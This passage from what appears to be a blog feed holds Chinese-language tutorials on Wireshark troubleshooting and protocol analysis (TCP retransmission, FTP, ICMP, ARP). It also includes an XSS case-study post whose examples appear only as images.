<p>事实上，这个场景非常普遍。恶意程序在多年前就使用这种方法，将用户重定向到存放恶意程序的网站。试想，如果黑客修改了你的hosts文件，那么你每次在登录网上银行的时候，实际上访问的却是一个伪造的网站，专门窃取用户的金钱，其后果是非常严重的。虽说这种技术早就存在，但是恶意程序发展至今，黑客往往也会采用新的方式来利用hosts文件达到自己的目的，往往会使人防不胜防。有兴趣研究这方面安全技术的朋友，可以参考我所主讲的《恶意代码分析实战》的相关章节内容，或者《病毒木马查杀实战》的“txt病毒分析”的课程。  </p>
<p>##总结<br>在我这次的讲解中，主机没有发送DNS请求是因为客户端出现了配置错误的问题，而并不是其它外部限制或外部的错误配置。在数据包层面上考察这个问题，我们可以迅速发现未知的可疑IP地址，也能够迅速发现DNS这个通信过程并不存在。通过这些信息，就可以确定客户端才是问题的根源。  </p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 排错篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[究竟是客户端问题还是打印机问题]]></title>
        <url>https://517736522.github.io/2017/03/28/%E7%A9%B6%E7%AB%9F%E6%98%AF%E5%AE%A2%E6%88%B7%E7%AB%AF%E9%97%AE%E9%A2%98%E8%BF%98%E6%98%AF%E6%89%93%E5%8D%B0%E6%9C%BA%E9%97%AE%E9%A2%98/</url>
        <content type="html"><![CDATA[<p>##网络情景概述<br>这次我们遇到的麻烦与一台打印机有关。我们发现打印机出现了故障，当用户发送大量的打印作业给它时，打印机会在打印几页之后停止工作。客户尝试改动驱动配置选项，但是没有任何效果。那么我们就有必要去确认一下，究竟是客户端问题还是打印机的问题。</p>
<p>由于问题的焦点在打印机身上，所以我们希望尽可能将嗅探器放到离打印机最近的地方。虽然我们不能在打印机上安装Wireshark，但是这个网络中使用了高级三层交换机，所以我们可以使用端口镜像功能。我们将打印机连接的端口镜像到一个空的端口，然后将一台装有Wireshark的电脑连接到该端口。安装完成后，我们让一位用户发送大量的打印作业给打印机，我们就监视端口输出的内容，于是得到了捕获文件Lab28-1.pcap。  </p>
<p>##端口镜像概述<br>我们之前说过，端口镜像往往是我们首选的功能，因为它不会留下网络痕迹，也不会因此而产生额外的数据包，可以在不让客户端脱机下线的情况下进行配置，非常便于镜像路由器或者服务器端口。这里我们结合下图进行说明：<br><img src="/2017/03/28/究竟是客户端问题还是打印机问题/1.jpg" alt="1"><br>端口镜像的方法，也许是在交换式网络中捕获一个目标设备所有的网络通信最简单的方法。为了使用端口镜像，必须能够通过命令行或者Web管理界面来访问目标设备所连接的交换机。此外，这个交换机还必须支持端口镜像的功能，以及有一个空闲的端口，以便于嗅探器的接入。</p>
<p>要启用端口镜像，需要发出一个命令，来强制交换机将一个端口上的所有通信都镜像到另一个端口上。例如，为了捕获交换机3号端口连接的设备发出的所有流量，只需要简单地将嗅探分析器接入4号端口，然后将3号端口镜像复制到4号端口，这就可以看到目标设备传输与接收的所有网络流量了。</p>
<p>设置端口镜像的具体方法取决于不同的设备制造商。对于大多数的交换机，需要登录到命令行界面，然后输入端口镜像的命令。并且在进行端口镜像时，需要留意所镜像端口的流量负载。有些交换机厂商允许你将多个端口的流量镜像到一个单独的端口上，这在分析一个交换机上两个或多个设备的网络通信时往往会非常有用。</p>
<p>这里可以举一个例子，比如有一个24端口的交换机，这里将23个全双工的100Mbit/s端口流量都镜像到一个端口上，那么这个端口就会有4600Mbit/s的流量。这将会远远超出一个单独端口的物理承受能力，因此在网络流量达到一定的数量级之后，就有可能出现数据包丢失，甚至网络速度变慢的情况。</p>
<p>在这种情况下，交换机会丢弃所有多余的数据包，甚至“暂停”它们内部的交换电路，从而造成通信中断。因此，当我们开始执行数据包的捕获的时候，需要务必小心不要让这种情况发生。  </p>
<p>##数据包分析<br>捕获文件的开头是发送打印作业的主机与打印机之间的TCP三次握手。握手之后，一个大小为1460字节的TCP数据包就发送到了打印机：<br><img src="/2017/03/28/究竟是客户端问题还是打印机问题/2.jpg" alt="2"><br>数据的大小既可以在Packet List面板的info列的右边看到，也可以在Packet Details面板的TCP头部信息的底部看到。</p>
<p>之后的5号数据包也包含有1460个字节，并且这个数据包也被打印机在6号数据包的位置确认了：<br><img src="/2017/03/28/究竟是客户端问题还是打印机问题/3.jpg" alt="3"><br>在捕获文件的最后几个数据包之前，数据流一直正常。121号数据包是一个TCP重传数据包，也是故障的第一个标志：<br><img src="/2017/03/28/究竟是客户端问题还是打印机问题/4.jpg" alt="4"><br>当一个设备发送TCP数据包给远程设备，远程设备没有确认此次的传输时，就会发送一个TCP重传数据包。一旦到达重传的时间，发送设备就假设远程设备没有收到数据，于是就立刻重传数据包。在通信停止之前，这个过程会重复多次。</p>
<p>在这个场景中，因为打印机没有确认传输的数据，客户工作站就向打印机发送重传数据包。如果展开TCP头部的SEQ/ACK analysis部分以及下方的额外信息，就可以从细节中看到为什么这是重传。根据Wireshark分析的结果，121号数据包是120号数据包的重传。另外，重传数据包的重传超时（RTO）是在5.5秒左右。并且我们也可以看到，数据包120到数据包121的时间间隔也大概是5.5秒。</p>
<p>122号数据包也是120号数据包的重传，这个数据包的RTO大约是11.1秒。根据Time列可以知道，这个数据包是在120号数据包过后的11.1秒发出的。这也是捕获文件中的最后一个数据包，而此时打印机也停止打印了。</p>
<p>对于最后两个数据包，我们还发现了“TCP Window Full”这样的标志。如果Wireshark发现发送方当前所发送的数据包会填满接收方的缓存时，就会在该TCP数据包上标记出“TCP Window Full”的字样。在接收方发出确认数据包之前，那么这个包含有“TCP Window Full”字样的数据包就会是发送方所发出的最后一个包含有数据的TCP数据包。</p>
<p>当接收方收到包含有“TCP Window Full”字样的数据包以后，如果不能够及时处理缓存中的内容，那么接收方一般会回复一条带有“TCP Zero Window”字样的数据包，请求发送方暂缓发送数据。不过我们的这个捕获文件中并没有收到这样的数据包。“TCP Window Full”和“TCP Zero Window”这种现象的起因，往往是数据的接收方在软件或者硬件上出现了问题。</p>
<p>幸好这个分析场景只涉及内网的两台设备，所以我们只需要确定是客户工作站的问题还是打印机的问题就可以了。可以看到，数据正常传输了很长时间，然而在某一时刻，打印机就停止响应工作站了。工作站也是尽了最大的努力使数据到达目的地，因为重传就是个明证，但是打印机就是没有响应。而这个问题因为换一台计算机也可以重现，所以可以认为是打印机的问题。 进一步分析后，我们发现打印机的内存出故障了。当大量的打印作业发送到打印机时，它只打印一定的页数，一旦访问特定的内存区域就停止工作。由此可见，内存问题导致了打印机无法接收新的数据，并中断了与主机的通信。  </p>
<p>##总结<br>尽管我们这次所研究的打印机问题并不是由于网络问题导致的，但是我们依旧可以使用Wireshark指出问题所在。和之前的场景不同的是，这里只出现了TCP的数据包，并且给我们留下了非常有用的信息。</p>
<p>在这个例子中，当通信意外停止时，我们靠TCP内置的重传功能指出了问题的确切位置。那么在以后的案例讨论中，我们还会经常依赖这样的功能来解决更加复杂的问题。  </p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 排错篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[网络数据包分析入门]]></title>
        <url>https://517736522.github.io/2017/03/28/%E7%BD%91%E7%BB%9C%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E7%B2%BE%E9%80%9A/</url>
        <content type="html"><![CDATA[<p>#认识wireshark的界面  </p>
<p>##1.了解wireshark界面的基础知识，知道界面中每部分的功能。<br><img src="/2017/03/28/网络数据包分析从入门到精通/1.jpg" alt="1"><br>选择网卡start<br><img src="/2017/03/28/网络数据包分析从入门到精通/2.jpg" alt="2"><br>标题栏：用于显示所分析的抓包文件的名称、捕获的设备名称以及Wireshark的 版本号。<br>菜单栏：Wireshark的标准菜单栏。<br>工具栏：常用功能的快捷图标按钮。<br>筛选区域：我们在实际的数据包分析中，可能在很短的时间内就能够捕获到成 千上万的数据包信息。这个时候就需要使用这里的筛选器，加上一定的条件，筛 选掉我们并不关心的数据包，从而更好地进行分析。我们在接下来的实际分析课程 中，会多次使用筛选功能。<br>Packet List面板：显示每个数据帧的摘要。需要强调的是，其实这里所捕获 的其实就是数据帧，但是出于表达的习惯，本系列的课程中的大部分时候，我会 以“数据包”的叫法来代替“数据帧”以及“分段”。这里采用表格的形式列出了 当前捕获文件中的所有数据包，其中包括了数据包序号、数据包捕获的相对时 间、数据包的源地址和目标地址、数据包的协议以及在数据包中找到的概 况信息等。<br>Packet Details面板：分析数据包的详细信息。这个面板分层次地显示了一个 数据包中的内容，并且可以通过展开或是收缩来显示这个数据包中所捕获的全部内 容。在我们的课程中，Packet List面板以及Packet Details面板是我们重点 关注的对象。<br>Packet Bytes面板：以十六进制和ASCII码的形式显示数据包的内容。这里显 示了一个数据包未经处理的原始样子，也就是在链路上传播时的样子。<br>状态栏：包含有专家信息、注释、包的数量和Profile。  </p>
<p>##2.通过实际的例子来展示wireshark对于所捕获的数据包的分层结构，了解wireshark对于数据包的强大的分析功能。<br>数据帧的起始点和目的点都在数据链路层<br>数据包的起始和目的地在网络层<br>段的起始点和目的地在传输层的信息单元<br><img src="/2017/03/28/网络数据包分析从入门到精通/3.jpg" alt="3"><br>下面分析该帧的详细信息共五种协议信息<br>frame表示的是在物理层数据帧的情况<br>ethernet表示在数据链路层以太网帧的头部信息<br>internet protocol表示的是网络层ip包的头部信息<br>transmission control表示的是传输层tcp数据段头部信息<br>hypertext transfer protocol表示应用层的信息</p>
<p>###首先介绍物理层的详细信息<br><img src="/2017/03/28/网络数据包分析从入门到精通/4.jpg" alt="4"><br>第一行表示为3934号帧，共310字节，实际捕获也是310字节<br>interface:接口ID<br>encapsulation type:封装的类型<br>arrival time:捕获的日期时间<br>[time delta from previous captured frame:与上一个数据包的捕获间隔]<br>[time delta from previous displayed frame:与第一个数据包的捕获间隔]<br>frame number:帧的序号<br>frame length:帧的长度<br>capture length:帧的捕获长度<br>frame is marked:帧是否做了标记<br>frame is ignored:帧是否被忽略<br>protocols in frame:帧的层次结构<br>coloring rule Name:着色标记的协议名称<br>coloring rule String:着色规则显示的字符串   </p>
<p>###数据链路层的详细信息<br><img src="/2017/03/28/网络数据包分析从入门到精通/5.jpg" alt="5"><br>destination：目标的mac地址<br>source:源mac地址<br>显示的mac前部分显示特定的厂商  </p>
<p>###网络层的详细信息<br><img src="/2017/03/28/网络数据包分析从入门到精通/6.jpg" alt="6"><br>version:4 代表ipv4<br>header length:ip包头部的长度<br>differentiated services field:ip包差分的服务字段<br>total length:ip包的总长度<br>identification:标识字段<br>flags:也是标识字段<br>fragment offset:分片的偏移<br>time to live :生存期<br>protocol:当前数据包的所封装的上层协议<br>header checksum: 为头部数据的校验和  </p>
<p>###传输层tcp数据段的详细信息<br>source port:源端口号<br>destination port：目标端口号<br>sequence number:相对的序列号<br>next sequence number:下一个序列号<br>acknowledgment number:确认的序列号<br>header length:头部长度<br>。。。。 0000 0001 ：tcp标记字段<br>windows size value:流量控制的窗口大小<br>checksum :tcp数据点的校验和   </p>
<p>##3.学习基本的数据包筛选方法，为以后的实际分析打下基础<br>filter:筛选器，筛选出感兴趣的内容<br>ip.addr==xxx and tcp.port==80<br>筛选出ip为xxx端口为80的数据包<br><img src="/2017/03/28/网络数据包分析从入门到精通/7.jpg" alt="7"><br>！tcp筛选出非tcp的数据包<br>frame.len&lt;=150 筛选出数据包长度小于等于150的<br>http 筛选出http包<br>tcp[13]==0x18筛选出特定tcp标识位<br><img src="/2017/03/28/网络数据包分析从入门到精通/8.jpg" alt="8">  </p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 基础篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[程序员与网络管理员的矛盾]]></title>
        <url>https://517736522.github.io/2017/03/28/%E7%A8%8B%E5%BA%8F%E5%91%98%E4%B8%8E%E7%BD%91%E7%BB%9C%E7%AE%A1%E7%90%86%E5%91%98%E7%9A%84%E7%9F%9B%E7%9B%BE/</url>
        <content type="html"><![CDATA[<p>##网络情景概述<br>在IT界，软件开发人员和系统管理员之间总会出现发生争吵的情况。开发人员总会将程序运行中的问题归咎于系统管理员糟糕的网络设置和落后的硬件设备。而系统管理员则倾向于把网络错误和网络缓慢的问题归咎于开发人员编写的糟糕的代码。<br><img src="/2017/03/28/程序员与网络管理员的矛盾/1.jpg" alt="1"><br>在我们这次的情景中，程序员开发了一个应用程序，用于跟踪多个商店的销售并报告回中心数据库。为了节约正常工作时间的带宽，程序员并没有将系统设计成实时传输数据的状态。而是等到报告数据积累一天之后，才会在晚上以逗号分隔符（comma-separated value，CSV）的文件格式传回，放入中心数据库中。</p>
<p>然而，这个新开发的应用程序在实际的工作中就出现了故障。服务器接收到了各个商店传回的文件，但是插入数据库的数据却出现了问题。一些地区的数据丢失了，有的数据还存在错误，并且文件的某些部分还丢失了。这就使得系统管理员很烦恼，因为程序员抱怨说这是网络问题，与编码无关。程序员还一口咬定文件在从商店传到中心数据库时被损坏了。那么究竟谁对谁错了，让我们利用Wireshark来分析一下吧。</p>
<p>为了收集到所需要的数据，我们可以在其中的一个商店或者中心办公室捕获数据包。由于故障影响了所有的商店，因此如果这确实是网络导致的问题，那么很可能就出在中心办公室的位置，因为它是左右商店通信的汇聚点。</p>
<p>网络交换机支持端口镜像，所以我们这里使用端口镜像功能来嗅探服务器的流量。我们抓取单个商店上传CSV文件到服务器的流量，得到捕获文件Lab30-1.pcap。  </p>
<p>##数据包分析<br>除了网络上的基本信息流量之外，我们对于程序员开发出的应用程序是完全不了解的。这次的捕获文件是以一些FTP数据包开始的，因此我们应当调查一下这是不是传输CSV文件所采用的机制。我们希望分析的界面能够简洁、干净，那么不妨看一下通信流量图。通信流量图能够为我们提供FTP通信的快速视图。我们可以选择菜单栏的Statistics-&gt;Flow Graph，然后单击OK，下图为结果图像：<br><img src="/2017/03/28/程序员与网络管理员的矛盾/2.jpg" alt="2"><br>在这个流量图中，我们看见了一个172.16.16.128与172.16.16.121之间的基本FTP连接。由于连接是由172.16.16.128发起的，所以我们猜测它就是客户端，172.16.16.121则是汇总和处理数据的服务器，通过这个流量图，让我们确认了这些流量只用到了FTP协议。</p>
<p>因为这里会有一些数据进行传输，所以我们使用FTP的知识，定位一下数据开始传输的位置。FTP连接和数据的传输都是由客户端发起的，因此我们应当寻找用于上传数据到FTP服务器的FTP STOR命令。这个命令用于让服务器接收来自数据连接的文件，如果服务器上有同样名字的文件，则会将其覆盖。找到STRO命令最简单的方法就是使用筛选器。</p>
<p>我们可以首先选择一个出现有FTP请求命令的数据包（比如5号数据包），这也是第一个FTP请求数据包。然后展开Packet Details面板的FTP section和USER section。右键点击Request Command：USER域，并选择Prepare a Filter中的Selected。</p>
<p>这将会生成一个含有FTP USER请求命令的数据包筛选条件，出现在了筛选器对话框中，接着我们可以编辑一下筛选器，将USER修改为STOR，之后回车：<br><img src="/2017/03/28/程序员与网络管理员的矛盾/3.jpg" alt="3"><br>现在可以看到，现在只剩下了一个包含有STOR的数据包。说明这个第64号数据包就是数据开始传输的位置。既然已经知道了数据从哪里开始传输，那么我们可以点击筛选器旁边的Clear将筛选条件删除。 我们查看从64号数据包开始的内容，可以看到这个数据包传输了名为store4829-03222010.csv的文件。STOR命令后面的数据包使用了不同的端口，但是仍然被识别成了FTP数据传输的一部分。我们知道数据已经在传输了，但是到目前为止还证明不了到底是哪里出现了问题。因此，我们需要从捕获的数据包里面，提取传输文件，以验证文件在网络传输后有没有遭到破坏。 当文件以未加密的格式在网络中传输时，它会被分解为多个段，并在目的地组装。这里我们可以亲自来提取这些文件。这里选择FTP数据流的任何一个数据包（比如66号数据包），单击Follow TCP Stream，结果显示如下：<br><img src="/2017/03/28/程序员与网络管理员的矛盾/4.jpg" alt="4"><br>由于数据在FTP中以明文进行传输，所以我们可以看到数据的原貌，但是不能够判断文件是否完整，为了重组数据并提取为原始格式，这里可以单击Save As按钮，并将其命名为我们在64号数据包所看到的文件名，再点击Save保存下来:<br><img src="/2017/03/28/程序员与网络管理员的矛盾/5.jpg" alt="5"><br>接下来我们可以使用计算哈希值的软件来计算我们所提取出来的文件和原始文件的哈希值。这里我所使用的是WinMD5这款软件：<br><img src="/2017/03/28/程序员与网络管理员的矛盾/6.jpg" alt="6"><br>可见结果是一致的，这就说明应用程序的数据库出错，并不是由于网络原因造成的。文件从商店传输到收集服务器的时候是完整的，因此可以肯定，应用程序在处理文件的时候，出现了错误。  </p>
<p>##总结<br>从网络数据包层面来进行分析的好处是，我们不需要处理杂乱无章的应用程序。世界上糟糕的程序还是很多的，远远多于优秀的程序，但是在数据包层面，就无所谓程序的好坏了。在这次的案例中，程序员会考虑应用程序所依赖的五花八门的组件。但最终，成百上千行的代码写成的数据传输，其实不过是FTP、TCP和IP而已。通过我们之前学习过的基本的协议的知识，我们就可以知道整个通信的过程是没有问题的，能够成功将文件提取出来，就说明了网络是正常的。请大家记住，只要使用了Wireshark，那么不论我们所面对的问题有多复杂，其实不过是一些数据包而已。  </p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 排错篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[用途广泛的ICMP协议]]></title>
        <url>https://517736522.github.io/2017/03/28/%E7%94%A8%E9%80%94%E5%B9%BF%E6%B3%9B%E7%9A%84ICMP%E5%8D%8F%E8%AE%AE/</url>
        <content type="html"><![CDATA[<p>##Echo请求与回应<br>对于ICMP协议来说，我们接触最多的莫过于ping这款工具了，相信很多计算机网络安全爱好者对它很熟悉。但是很多人对ping有个误解，以为它是一个命令，但事实上，ping是一款用于检测一个设备可连接性的工具，ping这款工具用于发送ICMP echo请求数据包。正因为如此，学习ICMP协议对于网络安全具有极其重要的意义。因为ICMP协议本身的特点就决定了它非常容易被用于攻击网络上的路由器和主机。比如，用户可以利用操作系统规定的ICMP数据包的最大尺寸不超过64K这个规定，向网络上的主机发起Ping of Death攻击，它属于一种拒绝服务（DDoS）攻击。因为当ICMP数据包的大小超过64K的时候，目标主机就有可能出现内存分配的错误的情况，导致TCP/IP堆栈崩溃，使得主机死机。另外，向目标主机长时间、连续、大量地发送ICMP数据包，也会最终使系统瘫痪。大量的ICMP数据包会形成“ICMP风暴”，使得目标主机耗费大量的CPU资源来处理。</p>
<p>下面我们来实际分析一个捕获文件。这个文件是我们在讲解第6课，也就是IP协议的时候，利用ping功能捕获的数据包（Lab11-1.pcapng）：<br><img src="/2017/03/28/用途广泛的ICMP协议/1.jpg" alt="1"><br>首先需要强调的是，在分析ICMP数据包的时候，我们需要重点关注的是ICMP头部的Type以及Code的内容。Type表示ICMP消息基于RFC规范的类型或分类。Code表示ICMP消息基于RFC规范的子类型。看一下第一个数据包，它显示了主机192.168.147.129在给172.21.79.153发送数据包。ICMP头部中的Type的值是8，Code值是0，说明这是一个echo请求数据包，Wireshark已经帮我们解析出来了。其实这是一个简单的ICMP数据包，使用IP发送，所包含的数据很少。除了指定的类型、代码以及校验和，这里还有序列号用于匹配请求和响应，并且在可变域中包含有一串随机字符串。</p>
<p>接下来我们再分析一下第二个数据包：<br><img src="/2017/03/28/用途广泛的ICMP协议/2.jpg" alt="2"><br>这个数据包是对我们请求的响应。在它的ICMP头部中，类型和代码的值都是0，表示这是一个echo响应。由于第二个数据包的序列号和第一个数据包可以相匹配，于是就可以确定它和第一个数据包是对应的。并且还可以发现，在Data的部分，这个数据包有着和第一个数据包相同的字符内容。当这个数据包被成功接收后，ping就成功了。</p>
<p>ICMP的echo请求使用的字符串可能会引起攻击者的兴趣，攻击者可能会使用这段内容来推测设备所使用的操作系统。并且攻击者可能在这个地方放置一些数据位作为反向连接的手段。  </p>
<p>##路由跟踪<br>路由跟踪功能用来识别一个设备到另一个设备的网络路径。在一个简单的网络上，这个网络路径可能只经过一个路由器，甚至一个路由器也不经过。但是在复杂的网络中，数据包可能会经过数十个路由器才会到达最终的目的地。对于网络通信检修来说，确定数据包从一个地方到另一个地方所走的路径是非常重要的。</p>
<p>想要进行路由跟踪，我们可以在命令提示符中使用tracert功能，它就是利用了ICMP协议的，通过其跟踪结果，我们就可以画出数据包所走的路径。这里我们可以分析一下Lab11-2.pcap实验文件：<br><img src="/2017/03/28/用途广泛的ICMP协议/3.jpg" alt="3"><br>首先看一下第一个数据包，可以发现它与我们刚才分析的echo请求很相像。这个数据包是从IP地址为192.168.100.138到4.2.2.1的简单的echo的请求，并且ICMP数据包头部的每一部分都与echo请求数据包相同。但是需要我们注意的是，这个数据包的IP头中的TTL的值为1，这也就意味着这个数据包会在它所遇到的第一个路由器的地方被丢弃。由于目标地址4.2.2.1其实是一个互联网的地址，我们就会知道源设备和目标设备之间肯定至少存在一个路由器，因此这个数据包不会到达目的地。</p>
<p>下面再看一下第二个数据包：<br><img src="/2017/03/28/用途广泛的ICMP协议/4.jpg" alt="4"><br>这个数据包其实就是在前往目的地的路径上，由第一个路由器发回的响应。由于第一个数据包到达192.168.100.1后，TTL的值变成了0，因此就不能够继续传输，此时路由器就回复了一个ICMP响应。这个数据包的类型是11，代码是0，告诉我们这个数据包的TTL在传输中超时，所以目标地址不可达。</p>
<p>这里请大家注意的是，在ICMP的结尾部分包含了原echo请求的IP头和ICMP数据的拷贝。因此这个数据包也被叫做ICMP双头包，表示包含有两个ICMP的包头信息。双包头信息在网络故障检修的时候会非常有用。</p>
<p>继续往下分析可以发现，在第七个数据包之前，又发送了两次TTL的值为1的数据包。而第七个数据包的TTL的值变成了2。这就保证了这个数据包会到达第二跳的路由。但是即便TTL的值变成了2，从下面的数据包来看，它也是无法到达目的地，直至TTL的值增长到9，这个数据包才到达了目的地。</p>
<p>当然我们在未来的课程中还会遇到ICMP协议，还会研究它的不同的功能，因此说ICMP是一个用途广泛的协议。  </p>
<p>##ICMP数据包的抓取<br>最后我们再来研究一下ICMP数据包的抓取。最常用的，是使用ping工具进行捕获，关于这个我们已经在第六课中演示过了。所以这里我们可以尝试使用tracert来尝试抓取。在虚拟机中，打开命令提示符，输入tracert加上目标IP地址（主机IP）：<br><img src="/2017/03/28/用途广泛的ICMP协议/5.jpg" alt="5"><br>然后看一下Wireshark的抓取结果（Lab11-3.pcapng）：<br><img src="/2017/03/28/用途广泛的ICMP协议/6.jpg" alt="6"><br>可以看到，这里也出现了由于TTL的值不够，而出现的数据包不可达的情况。</p>
<p>至此，本系列课程的所有通用的底层网络协议的分析就到这里，我们在未来的实际问题的分析中，会经常遇到诸如IP、TCP、UDP、以及ICMP这样的底层协议，因为它们是一切网络通信的基础，对我们未来的分析至关重要。那么从下次课程开始，我们会开始研究一些高级的、基于应用层的网络协议。</p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 协议篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[漏洞实例讲解XSS]]></title>
        <url>https://517736522.github.io/2017/03/28/%E6%BC%8F%E6%B4%9E%E5%AE%9E%E4%BE%8B%E8%AE%B2%E8%A7%A3XSS/</url>
        <content type="html"><![CDATA[<p><img src="/2017/03/28/漏洞实例讲解XSS/1.jpg" alt="1">  </p>
<p>##Discus!DOM型实例：<br><img src="/2017/03/28/漏洞实例讲解XSS/2.jpg" alt="2"><br><img src="/2017/03/28/漏洞实例讲解XSS/3.jpg" alt="3"><br><img src="/2017/03/28/漏洞实例讲解XSS/4.jpg" alt="4"><br><img src="/2017/03/28/漏洞实例讲解XSS/5.jpg" alt="5"><br><img src="/2017/03/28/漏洞实例讲解XSS/6.jpg" alt="6"><br><img src="/2017/03/28/漏洞实例讲解XSS/7.jpg" alt="7"><br><img src="/2017/03/28/漏洞实例讲解XSS/8.jpg" alt="8"><br>当管理员编辑时会触发<br>F12开发人员工具可以下断点跟踪<br><img src="/2017/03/28/漏洞实例讲解XSS/9.jpg" alt="9">  </p>
<p>##TurboMail存储型实例：<br><img src="/2017/03/28/漏洞实例讲解XSS/10.jpg" alt="10"><br><img src="/2017/03/28/漏洞实例讲解XSS/11.jpg" alt="11"><br><img src="/2017/03/28/漏洞实例讲解XSS/12.jpg" alt="12"><br>利用代码。<br><img src="/2017/03/28/漏洞实例讲解XSS/13.jpg" alt="13">  </p>
<p><img src="/2017/03/28/漏洞实例讲解XSS/14.jpg" alt="14"><br>受害者查看就触发<br><img src="/2017/03/28/漏洞实例讲解XSS/15.jpg" alt="15">  </p>
<p>##DedeCMS5.7反射型实例：<br><img src="/2017/03/28/漏洞实例讲解XSS/16.jpg" alt="16"><br><img src="/2017/03/28/漏洞实例讲解XSS/17.jpg" alt="17">  </p>
]]></content>
        
        <categories>
            
            <category> 信息安全 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[ARP协议的数据包分析]]></title>
        <url>https://517736522.github.io/2017/03/28/ARP%E5%8D%8F%E8%AE%AE%E7%9A%84%E6%95%B0%E6%8D%AE%E5%8C%85%E5%88%86%E6%9E%90/</url>
        <content type="html"><![CDATA[<p>##什么是ARP协议<br>协议分析篇第一个要研究的就是ARP协议。ARP（Address Resolution Protocol，地址解析协议）用于将IP地址解析为物理地址（MAC地址）。这里之所以需要使用MAC地址，是因为网络中用于连接各个设备的交换机使用了内容可寻址存储器（CAM，Coment Addressable Memory）。该存储器维护的ARP表列出了它在每一个端口的所有连接设备的MAC地址。</p>
<p>当交换机收到了一个指向特定MAC地址的网络流量，它就会使用这个表，来确定应该使用哪一个端口发送流量。如果目标MAC地址是未知的，那么这个传输设备会首先在它的缓存中查找这个地址，如果没有找到，那么这个地址就需要通过在网络上额外的通信中解析了。或者我们可以结合下图来说明这个问题：<br><img src="/2017/03/28/ARP协议的数据包分析/1.jpg" alt="1"><br>其详细工作原理为：</p>
<pre><code>（1）当主机A想要给主机B发送数据时，主机A会首先在自己的本地ARP缓存表中检查与主机B相匹配的MAC地址。
（2）如果主机A在自己的缓存表中没找到主机B的相关条目，那么它就要想办法获取主机B的MAC地址。这就需要将ARP的请求帧广播到本地网络上的所有主机中。这个请求帧包含有主机A的IP地址和MAC地址，以及主机B的IP地址。网络中凡是收到请求帧的主机都会检查自己的IP地址是否与请求地址一致，如果不一致，则会丢弃该请求帧。对于上图来说，主机C和主机D会丢弃主机A发出的请求帧。
（3）主机B确定ARP请求中的IP地址和自己的IP地址一致，那么就会将主机A的IP地址和MAC地址添加到本地的缓存列表中。
（4）主机B将包含有自己MAC地址的ARP响应消息直接回复给主机A（单播）。
（5）主机A收到从主机B发来的ARP响应消息后，会将主机B的IP地址和MAC地址添加到自己的ARP缓存表中。接下来，主机A就可以向主机B发送消息了。
</code></pre><p>如果想要查看ARP缓存表，可以打开cmd，输入“arp -a”：<br>输出的信息显示了本机接口为172.21.79.153地址的ARP缓存表。每行表示一个ARP条目。本地的缓存是有生命周期的，默认的ARP缓存表的有效期是120秒，过期后，需要重复上述过程。  </p>
<p>##分析ARP数据包<br>掌握了以上知识，我们就可以分析ARP数据包了。这里我们打开Lab6-1.pcap：<br><img src="/2017/03/28/ARP协议的数据包分析/2.jpg" alt="2"><br>可以看到，第1个数据包是一个ARP请求。我们可以通过Packet Details面板，检查以太网头部信息来确定这个数据包是不是一个真的广播数据包。</p>
<p>首先在Frame帧中，可以知道该数据包的大小为42个字节。</p>
<p>其次检查一下Ethernet部分的内容，会发现这个数据包目的地址是ff:ff:ff:ff:ff:ff，这是一个广播地址，说明当前数据包会被广播到当前网段中的所有设备上。而这个数据包中以太网的源地址就是本机的MAC地址。</p>
<p>接下来展开ARP请求的头部信息。按照顺序依次为硬件类型、协议类型、硬件地址长度、协议长度、操作码（该值为1，表示这是一个ARP请求包）、发送方的MAC和IP地址，以及接收方的IP地址。而我们想要获取的目标MAC地址还是未知的，因此就以全0的形式显示。</p>
<p>下面我们研究一下第二个数据包，来看看ARP的响应：<br><img src="/2017/03/28/ARP协议的数据包分析/3.jpg" alt="3"><br>其实ARP响应的数据包和ARP请求的数据包很相像。不同之处表现在以下几点：首先，用于响应的数据包的操作码（Opcode）现在是2，表明这是一个用于响应的数据包；其次，发送方的MAC地址和IP地址变成了目标MAC地址和IP地址；最后，响应数据包中的内容都是可用的，也就是说我们已经获取了192.168.0.1主机的MAC地址，即00:13:46:0b:22:ba，那么接下来就可以正常通信了。</p>
<p>最后我们再讨论一个关于免费ARP（gratuitous ARP）的例子。由于网络中一个设备的IP地址是可以改变的，而MAC地址不会改变。那么一旦出现IP地址改变的情况，网络主机中缓存的IP和MAC地址映射就不再有效了。那么为了防止由于映射失败造成的通信错误，免费的ARP请求会被发送到网络中，强制所有收到它的设备使用新的IP以及MAC地址映射来更新缓存。通常，它发生在系统引导期间进行接口配置或IP地址出现变化的时候。</p>
<p>这里我们分析一个包含有免费ARP的实验文件（Lab6-2.pcap）：<br><img src="/2017/03/28/ARP协议的数据包分析/4.jpg" alt="4"><br>首先我们可以看到这个数据包是以广播的形式发出的，这样一来，网络上的所有主机都能收到它。接下来我们可以发现，发送方的IP地址和接收方的IP地址是一致的。网络中的其它主机收到这个数据包之后，它会让这些主机使用新的IP和MAC地址映射关系来更新它们的ARP表。由于这个ARP数据包是源主机未经请求主动发出的，并导致了目标主机更新了ARP缓存，所以称之为免费的ARP。  </p>
]]></content>
        
        <categories>
            
            <category> 网络数据包分析实战 </category>
            
            <category> 协议篇 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
        <title><![CDATA[E-mail数据包的分析]]></title>
        <url>https://517736522.github.io/2017/03/28/E-mail%E6%95%B0%E6%8D%AE%E5%8C%85%E7%9A%84%E5%88%86%E6%9E%90/</url>
